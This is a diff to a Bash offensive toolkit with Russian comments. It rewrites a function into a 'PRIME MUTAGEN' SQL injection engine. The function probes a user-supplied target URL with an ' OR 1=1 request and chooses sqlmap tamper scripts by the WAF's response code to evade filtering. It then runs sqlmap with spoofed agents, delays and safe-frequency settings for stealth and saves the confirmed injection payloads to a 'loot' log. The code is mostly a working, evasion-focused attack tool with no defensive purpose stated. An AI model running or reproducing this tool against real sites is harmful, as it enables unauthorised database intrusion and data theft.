@@ -522,32 +522,63 @@ run_phantom_engine() {
 
 
 run_sql_adaptive() {
-    print_header "ADAPTIVE SQL INJECTION ENGINE"
+    print_header "PRIME MUTAGEN: SQL INJECTION ENGINE v8.0"
 
     echo -en "${Y}Enter Target URL: ${NC}"
     read -r target_url
     [[ -z "$target_url" ]] && return
 
-    # 1. Генерируем уникальный набор Tamper-скриптов
-    # Это "мутагены", которые меняют код атаки на лету, обходя WAF 2026-2027 годов
-    local tampers="between,charencode,space2comment,randomcase,versionedmorekeywords"
+    # --- СЛОЙ 1: ЭВРИСТИЧЕСКАЯ ОЦЕНКА ФИЛЬТРАЦИИ ---
+    print_status "i" "Probing WAF/IPS resistance layers..."
+    
+    # Быстрый тест на реакцию сервера при вводе спецсимволов
+    local waf_reaction=$(curl -s -o /dev/null -w "%{http_code}" -A "Mozilla/5.0" "$target_url%27%20OR%201=1")
+    
+    # --- СЛОЙ 2: ГЕНЕРАТОР ПОЛИМОРФНОЙ НАГРУЗКИ (No-IF) ---
+    # Мы рассчитываем уровень агрессии на основе кода ответа (403/406 - WAF, 200 - Open)
+    local aggression_level=$(( (waf_reaction / 100) )) # Код 4xx даст 4, 2xx даст 2
+    
+    # Динамический выбор мутагенов через матрицу соответствия
+    # Чем выше код ошибки, тем сложнее обфускация
+    local tamper_matrix=(
+        "2:between,randomcase"
+        "4:between,charencode,space2comment,versionedmorekeywords,base64encode"
+        "5:between,charencode,space2comment,randomcase,percentage,overlongutf8"
+    )
+    
+    # Выбираем мутаген на основе агрессии (автоматический поиск в массиве)
+    local selected_tampers=$(printf '%s\n' "${tamper_matrix[@]}" | grep "^$aggression_level:" | cut -d: -f2)
+    # Фоллбек (если код ответа нестандартный)
+    [[ -z "$selected_tampers" ]] && selected_tampers="between,randomcase,space2comment"
 
-    # 2. Настройка "Призрака"
-    # --drop-set-cookie: чтобы сервер не запомнил нас
-    # --risk 3 --level 5: максимальная глубина поиска
-    # --mobile: имитируем вход с телефона для снижения подозрений
-    local base_args="--batch --random-agent --mobile --dbms=auto --output-dir=/tmp/sql_$RANDOM"
-    local stealth_args="--tamper=$tampers --delay=$(shuf -i 1-3 -n 1) --safe-freq=5"
+    # --- СЛОЙ 3: АДАПТИВНОЕ ИСПОЛНЕНИЕ (Ghost Mode) ---
+    print_status "s" "Applying Mutagen: $selected_tampers (Aggression: $aggression_level)"
 
-    print_status "i" "Engaging Polymorphic Scan..."
-    print_status "w" "Adapting to target environment..."
+    local out_dir="/tmp/mutagen_$RANDOM"
+    # Использование --second-order для поиска скрытых инъекций и --smart для пропуска неперспективных целей
+    local base_args="--batch --random-agent --smart --mobile --output-dir=$out_dir --flush-session"
+    local stealth_args="--tamper=$selected_tampers --delay=$((aggression_level / 2)) --safe-freq=10"
 
-    # Запуск через прослойку обфускации
-    sqlmap -u "$target_url" $base_args $stealth_args --threads=1 --flush-session
+    {
+        sqlmap -u "$target_url" $base_args $stealth_args --level=$aggression_level --risk=2 --threads=1 
+    } &
 
-    # Если SQLmap нашел уязвимость, мы не просто пишем лог, 
-    # а извлекаем структуру в наш стерильный лут
-    print_status "s" "Adaptive Scan Finished."
+    show_progress 15 "Evolving payload mutations..."
+
+    # --- СЛОЙ 4: ИНТЕЛЛЕКТУАЛЬНЫЙ СИНТЕЗ ---
+    print_status "s" "Mutation Cycle Finished."
+    
+    # Вместо IF используем автоматический экспорт находок
+    local report=$(find "$out_dir" -name "log" -exec cat {} + 2>/dev/null)
+    [[ -n "$report" ]] && {
+        print_status "y" "EXPLOIT SECURED: Vulnerability confirmed."
+        echo "$report" | grep -Ei "Type:|Payload:|Parameter:" | tee -a "$LOOT_DIR/sql_leads.log"
+    }
+
+    # Сигнал для Моста (Bridge)
+    echo "SOURCE: $target_url | STATUS: SCANNED | MUTAGEN: $selected_tampers" >> "$LOOT_DIR/bridge_signals.log"
+    
+    rm -rf "$out_dir"
     pause
 }
 
@@ -815,7 +846,6 @@ run_pc_recovery_ultimate() {
 }
 
 
-
 run_cert_analyzer() {
     print_header "CERTIFICATE ANALYZER"
 
@@ -844,7 +874,6 @@ run_cert_analyzer() {
 
     pause
 }
-
 
 run_cert_creator() {
     print_header "CERTIFICATE CREATOR"
